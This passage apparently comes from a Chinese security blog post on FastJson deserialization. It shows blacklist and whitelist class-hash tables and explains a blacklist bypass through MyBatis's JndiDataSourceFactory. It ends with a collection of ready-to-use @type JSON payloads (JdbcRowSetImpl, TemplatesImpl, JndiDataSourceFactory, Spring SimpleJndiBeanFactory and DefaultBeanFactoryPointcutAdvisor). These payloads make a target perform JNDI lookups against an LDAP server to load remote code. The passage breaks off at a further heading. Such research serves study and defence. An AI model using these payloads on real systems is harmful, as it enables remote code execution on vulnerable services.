<td>7222019943667248779L</td>
<td>0x6439c4dff712ae8bL</td>
<td>java.util.EventListener</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-5076846148177416215L</td>
<td>0xb98b6b5396932fe9L</td>
<td>org.apache.commons.collections4.Transformer</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-4703320437989596122L</td>
<td>0xbeba72fb1ccba426L</td>
<td>org.apache.commons.collections4.functors</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-4314457471973557243L</td>
<td>0xc41ff7c9c87c7c05L</td>
<td>org.jdom2.transform.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>-2533039401923731906L</td>
<td>0xdcd8d615a6449e3eL</td>
<td>org.apache.hadoop.shaded.com.zaxxer.hikari.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>156405680656087946L</td>
<td>0x22baa234c5bfb8aL</td>
<td>com.p6spy.engine.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>1214780596910349029L</td>
<td>0x10dbc48446e0dae5L</td>
<td>org.apache.activemq.pool.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>3085473968517218653L</td>
<td>0x2ad1ce3a112f015dL</td>
<td>org.apache.aries.transaction.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>3129395579983849527L</td>
<td>0x2b6dd8b3229d6837L</td>
<td>org.apache.activemq.ActiveMQConnectionFactory</td>
</tr>
<tr>
<td>1.2.70</td>
<td>4241163808635564644L</td>
<td>0x3adba40367f73264L</td>
<td>org.apache.activemq.spring.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>7240293012336844478L</td>
<td>0x647ab0224e149ebeL</td>
<td>org.apache.activemq.ActiveMQXAConnectionFactory</td>
</tr>
<tr>
<td>1.2.70</td>
<td>7347653049056829645L</td>
<td>0x65f81b84c1d920cdL</td>
<td>org.apache.commons.jelly.</td>
</tr>
<tr>
<td>1.2.70</td>
<td>7617522210483516279L</td>
<td>0x69b6e0175084b377L</td>
<td>org.apache.axis2.transport.jms.</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-4537258998789938600L</td>
<td>0xc1086afae32e6258L</td>
<td>java.io.FileReader</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-4150995715611818742L</td>
<td>0xc664b363baca050aL</td>
<td>java.io.ObjectInputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-2995060141064716555L</td>
<td>0xd66f68ab92e7fef5L</td>
<td>java.io.FileInputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-965955008570215305L</td>
<td>0xf2983d099d29b477L</td>
<td>java.io.ObjectOutputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>-219577392946377768L</td>
<td>0xfcf3e78644b98bd8L</td>
<td>java.io.DataOutputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>2622551729063269307L</td>
<td>x24652ce717e713bbL</td>
<td>java.io.PrintWriter</td>
</tr>
<tr>
<td>1.2.71</td>
<td>2930861374593775110L</td>
<td>0x28ac82e44e933606L</td>
<td>java.io.Buffered</td>
</tr>
<tr>
<td>1.2.71</td>
<td>4000049462512838776L</td>
<td>0x378307cb0111e878L</td>
<td>java.io.InputStreamReader</td>
</tr>
<tr>
<td>1.2.71</td>
<td>4193204392725694463L</td>
<td>0x3a31412dbb05c7ffL</td>
<td>java.io.OutputStreamWriter</td>
</tr>
<tr>
<td>1.2.71</td>
<td>5545425291794704408L</td>
<td>0x4cf54eec05e3e818L</td>
<td>java.io.FileWriter</td>
</tr>
<tr>
<td>1.2.71</td>
<td>6584624952928234050L</td>
<td>0x5b6149820275ea42L</td>
<td>java.io.FileOutputStream</td>
</tr>
<tr>
<td>1.2.71</td>
<td>7045245923763966215L</td>
<td>0x61c5bdd721385107L</td>
<td>java.io.DataInputStream</td>
</tr>
<tr>
<td>1.2.78</td>
<td>-3750763034362895579L</td>
<td>0xcbf29ce484222325L</td>
<td>空串</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-8754006975464705441L</td>
<td>0x868385095a22725fL</td>
<td>org.apache.commons.io.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-8382625455832334425L</td>
<td>0x8baaee8f9bf77fa7L</td>
<td>org.mvel2.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-6088208984980396913L</td>
<td>0xab82562f53e6e48fL</td>
<td>kotlin.reflect.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-4733542790109620528L</td>
<td>0xbe4f13e96a6796d0L</td>
<td>com.googlecode.aviator.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-1363634950764737555L</td>
<td>0xed13653cb45c4bedL</td>
<td>org.aspectj.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>-803541446955902575L</td>
<td>0xf4d93f4fb3e3d991L</td>
<td>org.dom4j.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>860052378298585747L</td>
<td>0xbef8514d0b79293L</td>
<td>org.apache.commons.cli.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>1268707909007641340L</td>
<td>0x119b5b1f10210afcL</td>
<td>com.google.common.eventbus.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>3058452313624178956L</td>
<td>0x2a71ce2cc40a710cL</td>
<td>org.thymeleaf.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>3740226159580918099L</td>
<td>0x33e7f3e02571b153L</td>
<td>org.junit.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>3977090344859527316L</td>
<td>0x37317698dcfce894L</td>
<td>org.mockito.asm.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>4319304524795015394L</td>
<td>0x3bf14094a524f0e2L</td>
<td>com.google.common.io.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>5120543992130540564L</td>
<td>0x470fd3a18bb39414L</td>
<td>org.mockito.runners.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>5916409771425455946L</td>
<td>0x521b4f573376df4aL</td>
<td>org.mockito.cglib.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>6090377589998869205L</td>
<td>0x54855e265fe1dad5L</td>
<td>com.google.common.reflect.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>7164889056054194741L</td>
<td>0x636ecca2a131b235L</td>
<td>org.mockito.stubbing.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>8711531061028787095L</td>
<td>0x78e5935826671397L</td>
<td>org.apache.commons.codec.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>8735538376409180149L</td>
<td>0x793addded7a967f5L</td>
<td>ognl.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>8861402923078831179L</td>
<td>0x7afa070241b8cc4bL</td>
<td>com.google.common.util.concurrent.</td>
</tr>
<tr>
<td>1.2.83</td>
<td>9140416208800006522L</td>
<td>0x7ed9481d28bf417aL</td>
<td>java.awt.i</td>
</tr>
<tr>
<td>1.2.83</td>
<td>9144212112462101475L</td>
<td>0x7ee6c477da20bbe3L</td>
<td>com.google.common.net.</td>
</tr>
</tbody></table>
<p>另外还有一些暂时未知的：</p>
<table>
<thead>
<tr>
<th>version</th>
<th>hash</th>
<th>hex-hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>1.2.67</td>
<td>-831789045734283466L</td>
<td>0xf474e44518f26736L</td>
<td></td>
</tr>
<tr>
<td>1.2.71</td>
<td>3452379460455804429L</td>
<td>0x2fe950d3ea52ae0dL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-8614556368991373401L</td>
<td>0x8872f29fd0b0b7a7L</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-5472097725414717105L</td>
<td>0xb40f341c746ec94fL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-1800035667138631116L</td>
<td>0xe704fd19052b2a34L</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>-831789045734283466L</td>
<td>0xf474e44518f26736L</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>33238344207745342L</td>
<td>0x761619136cc13eL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>3452379460455804429L</td>
<td>0x2fe950d3ea52ae0dL</td>
<td></td>
</tr>
<tr>
<td>1.2.78</td>
<td>4215053018660518963L</td>
<td>0x3a7ee0635eb2bc33L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>-8614556368991373401L</td>
<td>0x8872f29fd0b0b7a7L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>-3750763034362895579L</td>
<td>0xcbf29ce484222325L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>-1800035667138631116L</td>
<td>0xe704fd19052b2a34L</td>
<td></td>
</tr>
<tr>
<td>1.2.83</td>
<td>4215053018660518963L</td>
<td>0x3a7ee0635eb2bc33L</td>
<td></td>
</tr>
</tbody></table>
<p>FastJson 还有一个白名单列表，高版本也内置了一些类：</p>
<table>
<thead>
<tr>
<th>hash</th>
<th>name</th>
</tr>
</thead>
<tbody><tr>
<td>0xD4788669A13AE74L</td>
<td>java.awt.Rectangle</td>
</tr>
<tr>
<td>0xE08EE874A26F5EAFL</td>
<td>java.awt.Point</td>
</tr>
<tr>
<td>0xDDAAA11FECA77B5EL</td>
<td>java.awt.Font</td>
</tr>
<tr>
<td>0xB81BA299273D4E6L</td>
<td>java.awt.Color</td>
</tr>
<tr>
<td>0xA8AAA929446FFCE4L</td>
<td>com.alibaba.fastjson.util.AntiCollisionHashMap</td>
</tr>
<tr>
<td>0xD0E71A6E155603C1L</td>
<td>com.alipay.sofa.rpc.core.exception.SofaTimeOutException</td>
</tr>
<tr>
<td>0x9F2E20FB6049A371L</td>
<td>java.util.Collections.UnmodifiableMap</td>
</tr>
<tr>
<td>0xD45D6F8C9017FAL</td>
<td>java.util.concurrent.ConcurrentSkipListMap</td>
</tr>
<tr>
<td>0x64DC636F343516DCL</td>
<td>java.util.concurrent.ConcurrentSkipListSet</td>
</tr>
<tr>
<td>0x7FE2B8E675DA0CEFL</td>
<td>org.springframework.dao.CannotAcquireLockException</td>
</tr>
<tr>
<td>0xF8C7EF9B13231FB6L</td>
<td>org.springframework.dao.CannotSerializeTransactionException</td>
</tr>
<tr>
<td>0x42646E60EC7E5189L</td>
<td>org.springframework.dao.CleanupFailureDataAccessException</td>
</tr>
<tr>
<td>0xCC720543DC5E7090L</td>
<td>org.springframework.dao.ConcurrencyFailureException</td>
</tr>
<tr>
<td>0xC0FE32B8DC897DE9L</td>
<td>org.springframework.dao.DataAccessResourceFailureException</td>
</tr>
<tr>
<td>0xDC9583F0087CC2C7L</td>
<td>org.springframework.dao.DataIntegrityViolationException</td>
</tr>
<tr>
<td>0x5449EC9B0280B9EFL</td>
<td>org.springframework.dao.DataRetrievalFailureException</td>
</tr>
<tr>
<td>0xEB7D4786C473368DL</td>
<td>org.springframework.dao.DeadlockLoserDataAccessException</td>
</tr>
<tr>
<td>0x44D57A1B1EF53451L</td>
<td>org.springframework.dao.DuplicateKeyException</td>
</tr>
<tr>
<td>0xC92D8F9129AF339BL</td>
<td>org.springframework.dao.EmptyResultDataAccessException</td>
</tr>
<tr>
<td>0x9DF9341F0C76702L</td>
<td>org.springframework.dao.IncorrectResultSizeDataAccessException</td>
</tr>
<tr>
<td>0xDB7BFFC197369352L</td>
<td>org.springframework.dao.IncorrectUpdateSemanticsDataAccessException</td>
</tr>
<tr>
<td>0x73FBA1E41C4C3553L</td>
<td>org.springframework.dao.InvalidDataAccessApiUsageException</td>
</tr>
<tr>
<td>0x76566C052E83815L</td>
<td>org.springframework.dao.InvalidDataAccessResourceUsageException</td>
</tr>
<tr>
<td>0x61D10AF54471E5DEL</td>
<td>org.springframework.dao.NonTransientDataAccessException</td>
</tr>
<tr>
<td>0x82E8E13016B73F9EL</td>
<td>org.springframework.dao.NonTransientDataAccessResourceException</td>
</tr>
<tr>
<td>0xE794F5F7DCD3AC85L</td>
<td>org.springframework.dao.OptimisticLockingFailureException</td>
</tr>
<tr>
<td>0x3F64BC3933A6A2DFL</td>
<td>org.springframework.dao.PermissionDeniedDataAccessException</td>
</tr>
<tr>
<td>0x863D2DD1E82B9ED9L</td>
<td>org.springframework.dao.PessimisticLockingFailureException</td>
</tr>
<tr>
<td>0x4BB3C59964A2FC50L</td>
<td>org.springframework.dao.QueryTimeoutException</td>
</tr>
<tr>
<td>0x552D9FB02FFC9DEFL</td>
<td>org.springframework.dao.RecoverableDataAccessException</td>
</tr>
<tr>
<td>0x21082DFBF63FBCC1L</td>
<td>org.springframework.dao.TransientDataAccessException</td>
</tr>
<tr>
<td>0x178B0E2DC3AE9FE5L</td>
<td>org.springframework.dao.TransientDataAccessResourceException</td>
</tr>
<tr>
<td>0x24AE2D07FB5D7497L</td>
<td>org.springframework.dao.TypeMismatchDataAccessException</td>
</tr>
<tr>
<td>0x90003416F28ACD89L</td>
<td>org.springframework.dao.UncategorizedDataAccessException</td>
</tr>
<tr>
<td>0x73A0BE903F2BCBF4L</td>
<td>org.springframework.jdbc.BadSqlGrammarException</td>
</tr>
<tr>
<td>0x7B606F16A261E1E6L</td>
<td>org.springframework.jdbc.CannotGetJdbcConnectionException</td>
</tr>
<tr>
<td>0xAFCB539973CEA3F7L</td>
<td>org.springframework.jdbc.IncorrectResultSetColumnCountException</td>
</tr>
<tr>
<td>0x4A39C6C7ACB6AA18L</td>
<td>org.springframework.jdbc.InvalidResultSetAccessException</td>
</tr>
<tr>
<td>0x9E404E583F254FD4L</td>
<td>org.springframework.jdbc.JdbcUpdateAffectedIncorrectNumberOfRowsException</td>
</tr>
<tr>
<td>0x34CC8E52316FA0CBL</td>
<td>org.springframework.jdbc.LobRetrievalFailureException</td>
</tr>
<tr>
<td>0xB5114C70135C4538L</td>
<td>org.springframework.jdbc.SQLWarningException</td>
</tr>
<tr>
<td>0x7F36112F218143B6L</td>
<td>org.springframework.jdbc.UncategorizedSQLException</td>
</tr>
<tr>
<td>0x26C5D923AF21E2E1L</td>
<td>org.springframework.cache.support.NullValue</td>
</tr>
<tr>
<td>0xD11D2A941337A7BCL</td>
<td>org.springframework.security.oauth2.common.DefaultExpiringOAuth2RefreshToken</td>
</tr>
<tr>
<td>0x4F0C3688E8A18F9FL</td>
<td>org.springframework.security.oauth2.common.DefaultOAuth2AccessToken</td>
</tr>
<tr>
<td>0xC59AA84D9A94C640L</td>
<td>org.springframework.security.oauth2.common.DefaultOAuth2RefreshToken</td>
</tr>
<tr>
<td>0x1F10A70EE4065963L</td>
<td>org.springframework.util.LinkedMultiValueMap</td>
</tr>
<tr>
<td>0x557F642131553498L</td>
<td>org.springframework.util.LinkedCaseInsensitiveMap</td>
</tr>
<tr>
<td>0x8B2081CB3A50BD44L</td>
<td>org.springframework.remoting.support.RemoteInvocation</td>
</tr>
<tr>
<td>0x8B2081CB3A50BD44L</td>
<td>org.springframework.remoting.support.RemoteInvocation</td>
</tr>
<tr>
<td>0x54DC66A59269BAE1L</td>
<td>org.springframework.security.web.savedrequest.SavedCookie</td>
</tr>
<tr>
<td>0x111D12921C5466DAL</td>
<td>org.springframework.security.web.csrf.DefaultCsrfToken</td>
</tr>
<tr>
<td>0x19DCAF4ADC37D6D4L</td>
<td>org.springframework.security.web.authentication.WebAuthenticationDetails</td>
</tr>
<tr>
<td>0x604D6657082C1EE9L</td>
<td>org.springframework.security.core.context.SecurityContextImpl</td>
</tr>
<tr>
<td>0xF4AA683928027CDAL</td>
<td>org.springframework.security.authentication.UsernamePasswordAuthenticationToken</td>
</tr>
<tr>
<td>0x92F252C398C02946L</td>
<td>org.springframework.security.core.authority.SimpleGrantedAuthority</td>
</tr>
<tr>
<td>0x6B949CE6C2FE009L</td>
<td>org.springframework.security.core.userdetails.User</td>
</tr>
</tbody></table>
<h3 id="JndiDataSourceFactory（1-2-25-1-2-46）"><a href="#JndiDataSourceFactory（1-2-25-1-2-46）" class="headerlink" title="JndiDataSourceFactory（1.2.25 - 1.2.46）"></a>JndiDataSourceFactory（1.2.25 - 1.2.46）</h3><p>这里我们可以通过 <code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code> 绕过。</p>
<p><code>JndiDataSourceFactory</code> 是 MyBatis 的一种 数据源工厂实现，用来从 JNDI（Java Naming and Directory Interface） 里查找并获取 DataSource 对象。我们可以通过下面这个 Maven 坐标引入：</p>
<div class="code-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>由于 <code>JndiDataSourceFactory</code> 不在 FastJson 的黑名单中，因此我们可以利用该类完成 JNDI 注入的利用。</p>
<p><code>JndiDataSourceFactory#setProperties</code> 函数定义如下：</p>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将外部传入的属性应用到 JNDI 数据源工厂：</span></span><br><span class="line"><span class="comment">// 典型属性键：</span></span><br><span class="line"><span class="comment">//   INITIAL_CONTEXT -&gt; 子上下文名（如 &quot;java:comp/env&quot;）</span></span><br><span class="line"><span class="comment">//   DATA_SOURCE     -&gt; 数据源 JNDI 名（如 &quot;jdbc/MyDB&quot; 或完整 &quot;java:comp/env/jdbc/MyDB&quot;）</span></span><br><span class="line"><span class="comment">//   以及可选的 JNDI 环境参数（由 getEnvProperties(properties) 提取，例如</span></span><br><span class="line"><span class="comment">//     &quot;java.naming.factory.initial&quot;, &quot;java.naming.provider.url&quot;,</span></span><br><span class="line"><span class="comment">//     &quot;java.naming.security.principal&quot;, &quot;java.naming.security.credentials&quot; 等）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setProperties</span><span class="params">(Properties properties)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        InitialContext initCtx;</span><br><span class="line">        <span class="comment">// 从传入的 properties 中提取 JNDI 环境参数（可为 null）。</span></span><br><span class="line">        <span class="comment">// - 在 Java EE/容器(Tomcat/WebLogic…)内，通常无需提供 env，使用默认 InitialContext 即可；</span></span><br><span class="line">        <span class="comment">// - 在纯 Java SE 场景，可通过 env 指定 provider/url/认证信息以连接远端 JNDI。</span></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">env</span> <span class="operator">=</span> getEnvProperties(properties);</span><br><span class="line">        <span class="keyword">if</span> (env == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 不提供 env：使用默认 JNDI 环境，通常由容器预置（最常见）。</span></span><br><span class="line">            initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 提供 env：基于自定义环境创建 InitialContext（如直连远端 JNDI 服务）。</span></span><br><span class="line">            initCtx = <span class="keyword">new</span> <span class="title class_">InitialContext</span>(env);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 两种查找路径：</span></span><br><span class="line">        <span class="comment">// 1) 既给了 INITIAL_CONTEXT 又给了 DATA_SOURCE：</span></span><br><span class="line">        <span class="comment">//    先在根上下文 lookup 到一个子 Context（如 &quot;java:comp/env&quot;），再在该 Context 下继续 lookup 数据源名（如 &quot;jdbc/MyDB&quot;）。</span></span><br><span class="line">        <span class="keyword">if</span> (properties.containsKey(INITIAL_CONTEXT) &amp;&amp; properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">ctx</span> <span class="operator">=</span> (Context) initCtx.lookup(properties.getProperty(INITIAL_CONTEXT));</span><br><span class="line">            dataSource = (DataSource) ctx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">        <span class="comment">// 2) 仅给了 DATA_SOURCE：</span></span><br><span class="line">        <span class="comment">//    直接在根 InitialContext 上按给定名执行 lookup。</span></span><br><span class="line">        <span class="comment">//    这里既可以是容器风格的完整名（如 &quot;java:comp/env/jdbc/MyDB&quot;），</span></span><br><span class="line">        <span class="comment">//    也可能是其它 JNDI URL（若 env/provider 指向远端目录服务）。</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (properties.containsKey(DATA_SOURCE)) &#123;</span><br><span class="line">            dataSource = (DataSource) initCtx.lookup(properties.getProperty(DATA_SOURCE));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NamingException e) &#123;</span><br><span class="line">        <span class="comment">// 将 JNDI 命名异常包装为 MyBatis 自己的 DataSourceException 抛出，便于上层定位配置问题。</span></span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">DataSourceException</span>(</span><br><span class="line">            <span class="string">&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot;</span> + e, e</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="其他-payload"><a href="#其他-payload" class="headerlink" title="其他 payload"></a>其他 payload</h3><p>以下为部分在各个途径搜集的 payload，版本自测：</p>
<p>JdbcRowSetImpl</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>TemplatesImpl</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgA...k=&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    &#x27;_name&#x27;<span class="punctuation">:</span> &#x27;su18&#x27;<span class="punctuation">,</span></span><br><span class="line">    &#x27;_tfactory&#x27;<span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>JndiDataSourceFactory</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;properties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;data_source&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>SimpleJndiBeanFactory</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;targetBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;propertyPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;su18&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">      <span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>DefaultBeanFactoryPointcutAdvisor</p>
<div class="code-container" data-rel="Json"><figure class="iseeu highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;beanFactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">     <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.jndi.support.SimpleJndiBeanFactory&quot;</span><span class="punctuation">,</span></span><br><span class="line">     <span class="attr">&quot;shareableResources&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">       <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line">     <span class="punctuation">]</span></span><br><span class="line">   <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">   <span class="attr">&quot;adviceBeanName&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ldap://127.0.0.1:23457/Command8&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">   <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;org.springframework.aop.support.DefaultBeanFactoryPointcutAdvisor&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></div>

<p>WrapperConnectionPoolDataSource</p>
